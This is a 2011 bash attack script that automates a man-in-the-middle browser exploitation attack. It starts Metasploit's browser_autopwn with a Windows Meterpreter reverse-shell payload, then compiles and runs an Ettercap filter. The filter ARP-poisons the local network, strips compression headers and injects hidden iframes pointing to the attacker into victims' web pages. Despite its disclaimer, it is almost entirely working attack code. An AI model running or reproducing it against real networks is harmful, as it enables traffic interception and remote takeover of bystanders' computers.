#!/bin/bash
#----------------------------------------------------------------------------------------------#
#metasploit-browser_autopwn.sh v0.0 (2011-01-13)                                               #
# (C)opyright 2011 - g0tmi1k                                                                   #
#---Important----------------------------------------------------------------------------------#
#                     *** Do NOT use this for illegal or malicious use ***                     #
#                By running this, YOU are using this program at YOUR OWN RISK.                 #
#            This software is provided "as is", WITHOUT ANY guarantees OR warranty.            #
#---License------------------------------------------------------------------------------------#
#  This program is free software: you can redistribute it and/or modify it under the terms     #
#  of the GNU General Public License as published by the Free Software Foundation, either      #
#  version 3 of the License, or (at your option) any later version.                            #
#                                                                                              #
#  This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;   #
#  without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.   #
#  See the GNU General Public License for more details.                                        #
#                                                                                              #
#  You should have received a copy of the GNU General Public License along with this program.  #
#  If not, see <http://www.gnu.org/licenses/>.                                                 #
#---Default Settings---------------------------------------------------------------------------#
# [Interface] Which interface to use.
interface="eth0"

#---Default Variables--------------------------------------------------------------------------#
       ourIP=$(ifconfig $interface | awk '/inet addr/ {split ($2,A,":"); print A[2]}')
         svn="33"        # SVN (Used for self-updating)
     version="0.1"       # Program version
trap 'cleanUp break' 2   # Captures interrupt signal (Ctrl + C)

#----Functions---------------------------------------------------------------------------------#
function action() { #action "title" "command" #screen&file #x|y|lines #hold
   if [ "$debug" == "true" ]; then echo -e "action~$@"; fi
   error="free"
   if [ -z "$1" ] || [ -z "$2" ]; then error="1"; fi
   if [ "$3" ] && [ "$3" != "true" ] && [ "$3" != "false" ]; then error="3"; fi
   if [ "$5" ] && [ "$5" != "true" ] && [ "$5" != "false" ]; then error="5"; fi

   if [ "$error" != "free" ]; then
      display error "action Error code: $error" 1>&2
      echo -e "---------------------------------------------------------------------------------------------\nERROR: action (Error code: $error): $1, $2, $3, $4, $5" >> $logFile
      return 1
   fi
   #----------------------------------------------------------------------------------------------#
   command="$2"
   #if [ "$quiet" == "true" ] || [ ! -e "/usr/bin/xterm" ]; then
   #   if [ "$verbose" == "2" ]; then echo "Command: eval $command"
   #   else command="$command &> /dev/null"; fi # Hides output
   #   if [ "$diagnostics" == "true" ]; then echo "$1~$command" >> $logFile; fi
   #   eval "$command"
   #elif [ "$quiet" == "false" ]; then
      xterm="xterm" #Defaults
      x="100"; y="0"
      lines="15"
      if [ "$5" == "true" ]; then xterm="$xterm -hold"; fi
      if [ "$verbose" == "2" ]; then echo "Command: $command"; fi
      if [ "$diagnostics" == "true" ]; then echo "$1~$command" >> $logFile; fi
      if [ "$diagnostics" == "true" ] && [ "$3" == "true" ]; then command="$command | tee -a $logFile"; fi
      if [ "$4" ]; then
         x=$(echo $4 | cut -d '|' -f1)
         y=$(echo $4 | cut -d '|' -f2)
         lines=$(echo $4 | cut -d '|' -f3)
      #fi
      if [ "$debug" == "true" ]; then echo -e "$xterm -geometry 100x$lines+$x+$y -T \"wiffy v$version - $1\" -e \"$command\""; fi
      $xterm -geometry 120x$lines+$x+$y -T "wiffy v$version - $1" -e "$command"
   fi
   return 0
}
function display() { #display type "message"
   if [ "$debug" == "true" ]; then echo -e "display~$@"; fi
   error="free"; output=""
   if [ -z "$1" ] || [ -z "$2" ]; then error="1"; fi
   if [ "$1" != "action" ] && [ "$1" != "info" ] && [ "$1" != "diag" ] && [ "$1" != "error" ]; then error="5"; fi

   if [ "$error" != "free" ]; then
      display error "display Error code: $error" 1>&2
      echo -e "---------------------------------------------------------------------------------------------\nERROR: display (Error code: $error): $1, $2" >> $logFile
      return 1
   fi
   #----------------------------------------------------------------------------------------------#
   if [ "$1" == "action" ]; then output="\e[01;32m[>]\e[00m"
   elif [ "$1" == "info" ]; then output="\e[01;33m[i]\e[00m"
   elif [ "$1" == "diag" ]; then output="\e[01;34m[+]\e[00m"
   elif [ "$1" == "error" ]; then output="\e[01;31m[!]\e[00m"; fi
   output="$output $2"
   echo -e "$output"

   if [ "$diagnostics" == "true" ]; then
      if [ "$1" == "action" ]; then output="[>]"
      elif [ "$1" == "info" ]; then output="[i]"
      elif [ "$1" == "diag" ]; then output="[+]"
      elif [ "$1" == "error" ]; then output="[!]"; fi
      echo -e "---------------------------------------------------------------------------------------------\n$output $2" >> $logFile
   fi
   return 0
}
function cleanUp() { #cleanUp #mode
   if [ $1 != "clean" ]; then echo; fi
   display action "Restoring: Environment"
   rm -rf "$(pwd)/tmp/"
   echo -e "\e[01;36m[*]\e[00m Done! (=   Have you... g0tmi1k?"
   exit 0
}

#---Main---------------------------------------------------------------------------------------#
echo -e "\e[01;36m[*]\e[00m metasploit-browser_autopwn.sh v$version"

#----------------------------------------------------------------------------------------------#
if [ "$(id -u)" != "0" ]; then display error "Run as root" 1>&2; cleanUp clean; fi

#----------------------------------------------------------------------------------------------#
display action "Configuring: Environment"
mkdir -p "$(pwd)/tmp"
echo 1 > /proc/sys/net/ipv4/ip_forward
killall -9 ruby ettercap 2> /dev/null
if [ "$(pgrep xterm)" ]; then killall -9 xterm; fi # Cleans up any running xterms.
kill "$(netstat -ap | grep 55553 | awk -F " " '{print $7}' | sed 's/\/.*//')" 2> /dev/null # Freeing up metasploit port
kill "$(netstat -ap | grep 80 | awk -F " " '{print $7}' | sed 's/\/.*//')" 2> /dev/null    # Freeing up metasploit (WWW) port

#---------------------------------------------------------------------
display action "Starting: Metasploit"
echo "#metasploit-browser_autopwn.rc
use server/browser_autopwn
set lhost $ourIP
set SRVPORT 80
set URIPATH /
set payload windows/meterpreter/reverse_tcp
show options
run" > "$(pwd)/tmp/metasploit-browser_autopwn.rc"
action "Metasploit" "msfconsole  -r \"$(pwd)/tmp/metasploit-browser_autopwn.rc\"" "true" "0|0|15" & sleep 2

#---------------------------------------------------------------------
display action "Starting: Ettercap"
echo "#metasploit-browser_autopwn.filter
#if (ip.proto == TCP && ip.dst != '$ourIP') {                   # If traffic using TCP protocol and its not comng to us,
#   if (tcp.dst == 80 || tcp.dst == 8080 ) {                    # ...and its going TO port 80/8080 (HTTP/HTTP Alt),
      if (search(DATA.data, \"gzip\")) {                        # ...and if it contains an gzip in its header:
         replace(\"gzip\", \"    \");                           # Ask the server not to encode packets - only use plain text;) *Four spaces to match original string*
         msg(\"[*] Zapped 'gzip'\\n\");                         # Let us know it's been done (=
      }
      if (search(DATA.data, \"deflate\")) {
         replace(\"deflate\", \"       \");
         msg(\"[*] Zapped 'deflate'\\n\");
      }
      if (search(DATA.data, \"gzip,deflate\")) {
         replace(\"gzip,deflate\", \"            \");
         msg(\"[*] Zapped 'gzip,deflate'\\n\");
      }
      if (search(DATA.data, \"Accept-Encoding\")) {
         replace(\"Accept-Encoding\", \"Accept-Rubbish!\");
         msg(\"[*] Zapped 'Accept-Encoding'\\n\");
      }
      if (search(DECODED.data, \"Accept-Encoding\")) {
         replace(\"Accept-Encoding\", \"Accept-Rubbish!\");
         msg(\"[*] Zapped 'Accept-Encoding' (Decoded)\\n\");
      }
#   }
#}

if (ip.proto == TCP && ip.dst != '$ourIP') {                       # If TCP and its not us,
 if (tcp.src == 80 || tcp.src == 8080) {                           # ...and traffic is going on port 80/8080 (HTTP):
  if (search(DATA.data, \"http://$ourIP\")){                       # ...and search data, to test for our 'tweak';)
   msg(\"[+] Injected Correctly!\\n\");                            # Let us know it's been done done
  }else{                                                           # *Ettercap only supports if/else - doesn't support not )=*
   if (search(DATA.data, \"</title>\")){                           # ...and is there something for us to inject into?
    replace(\"</title>\",\"</title><iframe src=\\\"http://$ourIP\\\" width=\\\"0\\\" height=\\\"0\\\" frameBorder=\\\"0\\\"></iframe>\");   # ...Insert our iframe to the webpage!
    msg(\"[>] Injecting via Method 1 (</title>)\\n\");             # Let us know we have done it (=
   }
  }
  if (search(DATA.data, \"http://$ourIP\")){
   msg(\"[+] Injected Correctly!\\n\");
  }else{
    if (search(DATA.data, \"<body>\")){
    replace(\"<body>\",\"<body><iframe src=\\\"http://$ourIP\\\" width=\\\"0\\\" height=\\\"0\\\" frameBorder=\\\"0\\\"></iframe>\");
    msg(\"[>] Injecting via Method 2 (<body>)\\n\");
   }
  }
  if (search(DATA.data, \"http://$ourIP\")){
   msg(\"[+] Injected Correctly!\\n\");
  }else{
   if (search(DATA.data, \"<BODY>\")){
    replace(\"<BODY>\",\"<BODY><iframe src=\\\"http://$ourIP\\\" width=\\\"0\\\" height=\\\"0\\\" frameBorder=\\\"0\\\"></iframe>\");
    msg(\"[>] Injecting via Method 3 (<BODY>)\\n\");
   }
  }
  if (search(DATA.data, \"http://$ourIP\")){
   msg(\"[+] Injected Correctly!\\n\");
  }
 }
}" > "$(pwd)/tmp/metasploit-browser_autopwn.filter"
action "Ettercap" "etterfilter \"$(pwd)/tmp/metasploit-browser_autopwn.filter\" -o \"$(pwd)/tmp/metasploit-browser_autopwn.ef\" && sleep 2 && ettercap -T -i $interface -q -F \"$(pwd)/tmp/metasploit-browser_autopwn.ef\" -M ARP -l \"$(pwd)/tmp/logfile-`date +%F-%s`\" -m \"$(pwd)/tmp/msgfile-`date +%F-%s`\" //80,8080 //" "true" "0|255|15" & sleep 2

#----------------------------------------------------------------------------------------------#
display info "Attacking! ...press CTRL+C to stop"
while [ "$(pgrep ruby)" ] ; do
   sleep 1
done

#----------------------------------------------------------------------------------------------#
cleanUp clean
